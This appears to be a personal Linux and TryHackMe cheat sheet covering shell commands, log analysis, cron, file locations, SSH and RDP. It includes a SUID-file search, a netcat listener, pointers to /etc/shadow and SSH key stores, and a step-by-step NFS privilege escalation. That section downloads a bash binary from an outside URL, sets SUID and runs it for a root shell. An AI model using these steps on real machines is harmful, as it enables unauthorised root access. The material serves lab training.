# Navigate

```
&
```

allows us to execute commands in the background	`e.g cp file.txt filecopy.txt &`

```
&&
```

to make a list of commands to run
e.g. `sudo apt update && sudo apt-get install whois`

```
su user2
```

switch user to user2

```
./
```
"." denotes the current working directory

"." before a filename is how *nix denotes hidden files in its structure

```
\	
```
escape character - escapes the next character from stdin
```
file [filename]
```
prints file content to stdout
```
2>/dev/null
```
redirects stderr to Null
```
mktemp -d
```
makes directory in /tmp with random name
```
du
```
displays file space usage
```
ps
```
processes
```
kill [PID]
```
kills the proccess of that PID no#
```
Ctrl+z
```
backgrounds the current process
```
fg
```
foregrounds current process
# Add HOSTNAME

How to add hostname 
- If you are connected via VPN or AttackBox, you can add the hostname `mcgreedysecretc2.thm` by first opening the host file, depending on your host operating system.  
- Windows                       :  `C:\Windows\System32\drivers\etc\hosts`
- Ubuntu or AttackBox: `/etc/hosts`

- Open the host file and add a new line at the end of the file in the format: `10.10.196.106 mcgreedysecretc2.thm`
- Save the file and type `http://mcgreedysecretc2.thm` in the browser to access the website.

# IP Info

`ifconfig`
Unix-like operating systems, displays or configures IP settings for network interfaces.

`netstat`
Displays a variety of network information, including active connections, routing tables, and traffic statistics.

`arp`
Displays the IPv4 ARP cache.

`traceroute`
Views or manipulates the IP routing table used to find paths to network addresses

`nslookup`
Performs DNS lookups and displays the IP address of a given hostname.digA more powerful alternative to nslookup. Particularly useful for zone transfers.

`traceroute`
`tracert`
Displays the hop-by-hop path to a given host, along with the round-trip time to each hop.

# File Direction

## Find

`find / -perm -u=s -type f 2>/dev/null

- `find - Initiates the "find" command  
- `/` - Searches the whole file system  
- `-perm` - searches for files with specific permissions  
- `-u=s` - Any of the permission bits _mode_ are set for the file. Symbolic modes are accepted in this form
- `-type f**` - Only search for files  
- `2>/dev/null - Suppresses errors

prints list > then pipes that to file
`ls | file -f -
displays location of file
`which [filename]

`grep
searches for patterns
- -i ignores case
- -v inverts search case (ignore everything with [pattern]
- -n prints what line number is beside each grep
- -A 2 -B 4  -- prints the 2 lines AFTER and 4 lines BEFORE

grep a file
`grep "ftp" /usr/share/nmap/scripts/script.db
-E	Searches using regex (regular expressions). For example, we can search for lines that contain either "thm" or "tryhackme"	
`grep -E "thm|tryhackme" log.txt
Search recursively. For example, search all of the files in a directory for this value.
`grep -r "helloworld" mydirectory

ls a directory for files that contain *ftp*
`ls -l /usr/share/nmap/scripts/*ftp*
sort lines of text files
`sort
displays lines that are repeated
`uniq
finds string patterns in a file
`strings 
only see one field from the password file.
`cut -d:  -f1
For example, to just see the Unix user names, use the command 
` “$ cat /etc/passwd | cut -d: -f1.” 
The nl command stands for **number lines**. It renders the contents of the file in a numbered line format.
`nl access.log

## Log Analysis

cuts into columns delimited by a space ( ' ' ) 
`cut -d ' ' -f1,3,6 access.log
takes columns 1,3 & 6

- The first use of the cut command retrieves the column of the domain:port, and the second one removes the port by splitting it with a colon.

~~~
ubuntu@tryhackme:~/Desktop/artefacts$ cut -d ' ' -f3 access.log | cut -d ':' -f1
sway.com
sway.com
sway.office.com
--- REDACTED FOR BREVITY ---
~~~

-  After retrieving the domains, the sort command arranges the list in alphabetical order

~~~
ubuntu@tryhackme:~/Desktop/artefacts$ cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort
account.activedirectory.windowsazure.com
account.activedirectory.windowsazure.com
account.activedirectory.windowsazure.com
--- REDACTED FOR BREVITY ---
~~~

- Lastly, the uniq command removes all the duplicates

~~~
ubuntu@tryhackme:~/Desktop/artefacts$ cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort | uniq
account.activedirectory.windowsazure.com
activity.windows.com
admin.microsoft.com

--- REDACTED FOR BREVITY ---
~~~


----

# Zip Files

```
xxd -r
```
reverts a hexdump file
```
zcat
bzcat
```
decompresses file to stdout

```
tar
```
collects two or more files into one file using
a format that allows the files to be extracted later
>commonly compressed with gzip, bzip2 into a “tarball”.

```
tar xO
```
extracts tar files


# Cron

`crontab -l
shows cron jobs
https://crontab-generator.org/

holds cronjob info
/etc/crontab

crontabs have the following format:
`<minute> <hour> <day of month> <month> <day of week> <user> <command>`
# Ps

`top`
displays cpu jobs and pids
`systemctl list-unit-files`
lists all services

# ----Handy Nix FILES----

>`var/log

>`.bashrc

list of users
`>/etc/passwd`

SSH keys stored at 
`>/home/user/.ssh`

list of available shells 
`/etc/shells

holds cronjob info
/etc/crontab

logs access information, ip of logins etc

>`/usr/share/seclists

>`/usr/share/wordlists

>`The ~/.ssh folder is the default place to store these keys for OpenSSH

>`/etc/hosts

>`/etc/passwd

>`password hashes are stored in /etc/shadow

shows logs
>`/var/log

| Category | Description | File | Example |
|---|---|---|---|
|Authentication|This log file contains all authentication (log in). This is usually attempted either remotely or on the system itself (i.e., accessing another user after logging in).|	auth.log|Failed password for root from 192.168.1.35 port 22 ssh2.
|Package Management |This log file contains all events related to package management on the system. When installing a new software (a package), this is logged in this file. This is useful for debugging or reverting changes in case this installation causes unintended behaviour on the system.|dpkg.log|2022-06-03 21:45:59 installed neofetch
|Syslog	|This log file contains all events related to things happening in the system's background. For example, crontabs executing, services starting and stopping, or other automatic behaviours such as log rotation. This file can help debug problems.|syslog|2022-06-03 13:33:7 Finished Daily apt download activities..|
|Kernel|This log file contains all events related to kernel events on the system. For example, changes to the kernel, or output from devices such as networking equipment or physical devices such as USB devices.|	kern.log|2022-06-03 10:10:01 Firewalling registered|

# Common Hash Prefix

>$1$	    md5crypt, used in Cisco stuff and older Linux/Unix systems
>$2$, $2a$, $2b$, $2x$, $2y$        Bcrypt (Popular for web applications)
>$6$    	sha512crypt (Default for most Linux/Unix systems)

# GPG

```
gpg --import [keyfile]
```

imports secret key

```
gpg --decrypt [FILE_TO_DECRYPT]
```

---
# Connect
```
telnet [ip_address] [port] 
```
```
nc [nameofhost] [port]
```
connects to host

```
openssl s_client -connect [host]:[port] -ign_eof
```
connects to port using ssl encryption

``` 
nc -lvp 4444
```
sets a listener to port 4444

## SSH

```
ssh raz@10.10.169.1
```
~~~
ssh -i [rsa_key_filename] [user]@[ip_address]
~~~
~~~
ssh -i keyNameGoesHere user@host
~~~
how you specify a key for the standard Linux OpenSSH client.
>The ~/.ssh folder is the default place to store these keys for OpenSSH

**ensure you use `chmod 600 rsa_key_filename`**

```
ssh-copy-id -i ~/.ssh/id_rsa.pub YOUR_USER_NAME@IP_ADDRESS_OF_THE_SERVER
```
Your public key should be copied at the appropriate folder on the remote server automatically.

```
mysql -h [IP] -u [username] -p
```
Connect to MYSQL server

## Remote Desktop - RDP

```
rdesktop 10.10.180.211 -u THM\Administrator -p Password123
```

remotes into IP

**Then connecting via RDP, use THM\Administrator as the username to specify you want to log in using the user Administrator on the THM domain.**


# NFS Share Reverse Shell

1. step one

    ```
     showmount -e [IP]
    ```
    shows visible NFS shares on that IP 

2. Step Two

    ```
    sudo mount -t nfs IP:share /tmp/mount/ -nolock
    ```
    mounts the share from "IP:share" to the directory "/tmp/mount"

3. Step Three
    Download Bash executable
    ```
    get https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash -P ~/Downloads
    ```
4. Step Four

    ```
    cp ~/Downloads/bash ~/share
    ```
    Copy it to the NFS mount point

5. Step Five

    Change its permissions
    ```
    sudo chmod +s bash
    sudo chmod +x bash
    file should have "-rwsr-sr-x" as permissions
    ```
6. Step Six
    ssh into the machine that now holds the bash executable
    run the executable using
	```
    ./bash -p
    ```
>You should now have a shell as "root"



---

# RSA

The key variables that you need to know about for RSA in CTFs are p, q, m, n, e, d, and c.

“p” and “q” are large prime numbers, “n” is the product of p and q.

The public key is n and e, the private key is n and d.

“m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).

# REGEX

- [0-9] - Will include numbers 0-9

- [0] - Will include only the number 0

- [A-z] - Will include both upper and lowercase

- [A-Z] - Will include only uppercase letters

- [a-z] - Will include only lowercase letters

- [a] - Will include only a

- [!£$%@] - Will include the symbols !£$%@


# Exit VIM

To save a file and exit Vim, do the following:

- Switch to command mode by pressing the Esc key.
- Press : (colon) to open the prompt bar in the bottom left corner of the window.
- Type x after the colon and hit Enter. This will save the changes and exit.

---
